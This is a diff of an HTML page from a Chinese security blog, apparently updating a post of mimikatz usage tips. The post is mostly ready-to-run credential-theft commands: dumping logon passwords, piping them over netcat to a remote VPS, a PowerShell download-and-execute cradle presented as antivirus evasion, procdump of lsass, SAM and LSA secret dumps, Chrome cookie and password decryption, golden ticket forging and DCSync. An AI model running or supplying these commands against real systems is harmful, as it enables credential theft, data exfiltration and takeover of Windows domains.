@@ -115,7 +115,7 @@
 <meta property="og:site_name" content="RcoIl的窝">
 <meta property="og:description" content="mimikatz平时一般使用技巧">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-03-19T16:01:15.589Z">
+<meta property="og:updated_time" content="2019-05-13T09:31:34.109Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="mimikatz使用技巧">
 <meta name="twitter:description" content="mimikatz平时一般使用技巧">
@@ -443,18 +443,21 @@
 
       
         <p>mimikatz平时一般使用技巧<br><a id="more"></a></p>
-<h2 id="非交换式"><a href="#非交换式" class="headerlink" title="非交换式"></a>非交换式</h2><h3 id="打印（输出）mimikatz执行过程的log"><a href="#打印（输出）mimikatz执行过程的log" class="headerlink" title="打印（输出）mimikatz执行过程的log"></a>打印（输出）mimikatz执行过程的log</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;log sekurlsa::logonpasswords full&quot;&quot; exit &amp;&amp; dir</span><br></pre></td></tr></table></figure>
+<h2 id="0x00-非交换式"><a href="#0x00-非交换式" class="headerlink" title="0x00 非交换式"></a>0x00 非交换式</h2><h3 id="打印（输出）mimikatz执行过程的log"><a href="#打印（输出）mimikatz执行过程的log" class="headerlink" title="打印（输出）mimikatz执行过程的log"></a>打印（输出）mimikatz执行过程的log</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;log sekurlsa::logonpasswords full&quot;&quot; exit &amp;&amp; dir</span><br></pre></td></tr></table></figure>
 <h3 id="读取的密码导出在mimikatz的目录，然后用webshell-将log文件copy到web下，在线访问"><a href="#读取的密码导出在mimikatz的目录，然后用webshell-将log文件copy到web下，在线访问" class="headerlink" title="读取的密码导出在mimikatz的目录，然后用webshell 将log文件copy到web下，在线访问"></a>读取的密码导出在mimikatz的目录，然后用webshell 将log文件copy到web下，在线访问</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;sekurlsa::logonpasswords full&quot;&quot; exit &gt;&gt; log.txt</span><br></pre></td></tr></table></figure>
 <h3 id="nc到vps"><a href="#nc到vps" class="headerlink" title="nc到vps"></a>nc到vps</h3><p>非交互抓明文,不留任何文件,直接把抓取结果用nc发到指定的远程机器(一般是自己的vps)上,可能有些端口出不来,换几个常用的即可,80,8080,443,53……<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;sekurlsa::logonpasswords full&quot;&quot; exit |  nc -vv 192.168.3.251 1234  在目标机器上执行</span><br><span class="line">nc -lvp 1234  本地(vps上)机器执行</span><br></pre></td></tr></table></figure></p>
-<h2 id="两种免杀方式"><a href="#两种免杀方式" class="headerlink" title="两种免杀方式"></a>两种免杀方式</h2><h3 id="使用powershell"><a href="#使用powershell" class="headerlink" title="使用powershell"></a>使用powershell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;http://is.gd/oeoFuI&apos;); Invoke-Mimikatz -DumpCreds&quot;</span><br></pre></td></tr></table></figure>
+<h2 id="0x01-两种免杀方式"><a href="#0x01-两种免杀方式" class="headerlink" title="0x01 两种免杀方式"></a>0x01 两种免杀方式</h2><h3 id="1-使用powershell"><a href="#1-使用powershell" class="headerlink" title="1) 使用powershell"></a>1) 使用powershell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;http://is.gd/oeoFuI&apos;); Invoke-Mimikatz -DumpCreds&quot;</span><br></pre></td></tr></table></figure>
 <p><code>Tips：</code>powershell 默认windows visa后才有。也可以将结果发送到vps上。</p>
-<h3 id="procdump-lsass-进程导出"><a href="#procdump-lsass-进程导出" class="headerlink" title="procdump lsass 进程导出"></a>procdump lsass 进程导出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp //For 32 bits</span><br><span class="line">C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp //For 64 bits</span><br></pre></td></tr></table></figure>
+<h3 id="2-procdump-lsass-进程导出"><a href="#2-procdump-lsass-进程导出" class="headerlink" title="2) procdump lsass 进程导出"></a>2) procdump lsass 进程导出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp //For 32 bits</span><br><span class="line">C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp //For 64 bits</span><br></pre></td></tr></table></figure>
 <ul>
 <li>本地使用mimikatz还原<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line">sekurlsa::minidump lsass.dmp</span><br><span class="line">sekurlsa::logonPasswords full</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
-<h2 id="获取vpn密码"><a href="#获取vpn密码" class="headerlink" title="获取vpn密码"></a>获取vpn密码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe privilege::debug token::elevate lsadump::sam lsadump::secrets exit</span><br></pre></td></tr></table></figure>
-<h2 id="浏览器密码"><a href="#浏览器密码" class="headerlink" title="浏览器密码"></a>浏览器密码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe privilege::debug log &quot;dpapi::chrome /in:%localappdata%\google\chrome\USERDA~1\default\cookies /unprotect&quot; exit</span><br><span class="line">mimikatz.exe privilege::debug log &quot;dpapi::chrome /in:%localappdata%\google\chrome\USERDA~1\default\LOGIND~1&quot; exit //读chrome密码</span><br></pre></td></tr></table></figure>
+<h2 id="0x02-日常使用"><a href="#0x02-日常使用" class="headerlink" title="0x02 日常使用"></a>0x02 日常使用</h2><h3 id="1-黄金票据"><a href="#1-黄金票据" class="headerlink" title="1) 黄金票据"></a>1) 黄金票据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[*] 制作</span><br><span class="line">	mimikatz # kerberos::golden /krbtgt:26e67be3519825ba5c9f4f95af987fac /admin:Administrator /domain:rcoil.me /sid:S-1-5-21-3847150913-2250841228-2965060751 /ticket:Administrator.kiribi</span><br><span class="line">[*] 使用</span><br><span class="line">	mimikatz # kerberos::ptt Administrator.kiribi</span><br><span class="line">	mimikatz # kerberos::tgt</span><br></pre></td></tr></table></figure>
+<h3 id="2-获取-vpn-密码"><a href="#2-获取-vpn-密码" class="headerlink" title="2) 获取 vpn 密码"></a>2) 获取 vpn 密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe privilege::debug token::elevate lsadump::sam lsadump::secrets exit</span><br></pre></td></tr></table></figure>
+<h3 id="3-浏览器密码"><a href="#3-浏览器密码" class="headerlink" title="3) 浏览器密码"></a>3) 浏览器密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe privilege::debug log &quot;dpapi::chrome /in:\&quot;%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data1\&quot; /unprotect&quot; exit //读chrome密码</span><br></pre></td></tr></table></figure>
+<h3 id="4-获取某用户的密码"><a href="#4-获取某用户的密码" class="headerlink" title="4) 获取某用户的密码"></a>4) 获取某用户的密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz lsadump::dcsync /domain:rcoil.me /user:rcoil</span><br></pre></td></tr></table></figure>
+
       
     </div>
 
@@ -612,7 +615,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">30</span>
+                <span class="site-state-item-count">32</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -623,7 +626,7 @@
             
             <div class="site-state-item site-state-categories">
               <a href="/categories/index.html">
-                <span class="site-state-item-count">7</span>
+                <span class="site-state-item-count">9</span>
                 <span class="site-state-item-name">分类</span>
               </a>
             </div>
@@ -634,7 +637,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">17</span>
+                <span class="site-state-item-count">18</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
@@ -785,7 +788,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#非交换式"><span class="nav-number">1.</span> <span class="nav-text">非交换式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#打印（输出）mimikatz执行过程的log"><span class="nav-number">1.1.</span> <span class="nav-text">打印（输出）mimikatz执行过程的log</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#读取的密码导出在mimikatz的目录，然后用webshell-将log文件copy到web下，在线访问"><span class="nav-number">1.2.</span> <span class="nav-text">读取的密码导出在mimikatz的目录，然后用webshell 将log文件copy到web下，在线访问</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nc到vps"><span class="nav-number">1.3.</span> <span class="nav-text">nc到vps</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#两种免杀方式"><span class="nav-number">2.</span> <span class="nav-text">两种免杀方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#使用powershell"><span class="nav-number">2.1.</span> <span class="nav-text">使用powershell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#procdump-lsass-进程导出"><span class="nav-number">2.2.</span> <span class="nav-text">procdump lsass 进程导出</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#获取vpn密码"><span class="nav-number">3.</span> <span class="nav-text">获取vpn密码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#浏览器密码"><span class="nav-number">4.</span> <span class="nav-text">浏览器密码</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-非交换式"><span class="nav-number">1.</span> <span class="nav-text">0x00 非交换式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#打印（输出）mimikatz执行过程的log"><span class="nav-number">1.1.</span> <span class="nav-text">打印（输出）mimikatz执行过程的log</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#读取的密码导出在mimikatz的目录，然后用webshell-将log文件copy到web下，在线访问"><span class="nav-number">1.2.</span> <span class="nav-text">读取的密码导出在mimikatz的目录，然后用webshell 将log文件copy到web下，在线访问</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nc到vps"><span class="nav-number">1.3.</span> <span class="nav-text">nc到vps</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-两种免杀方式"><span class="nav-number">2.</span> <span class="nav-text">0x01 两种免杀方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-使用powershell"><span class="nav-number">2.1.</span> <span class="nav-text">1) 使用powershell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-procdump-lsass-进程导出"><span class="nav-number">2.2.</span> <span class="nav-text">2) procdump lsass 进程导出</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-日常使用"><span class="nav-number">3.</span> <span class="nav-text">0x02 日常使用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-黄金票据"><span class="nav-number">3.1.</span> <span class="nav-text">1) 黄金票据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-获取-vpn-密码"><span class="nav-number">3.2.</span> <span class="nav-text">2) 获取 vpn 密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-浏览器密码"><span class="nav-number">3.3.</span> <span class="nav-text">3) 浏览器密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-获取某用户的密码"><span class="nav-number">3.4.</span> <span class="nav-text">4) 获取某用户的密码</span></a></li></ol></li></ol></div>
             
 
           </div>
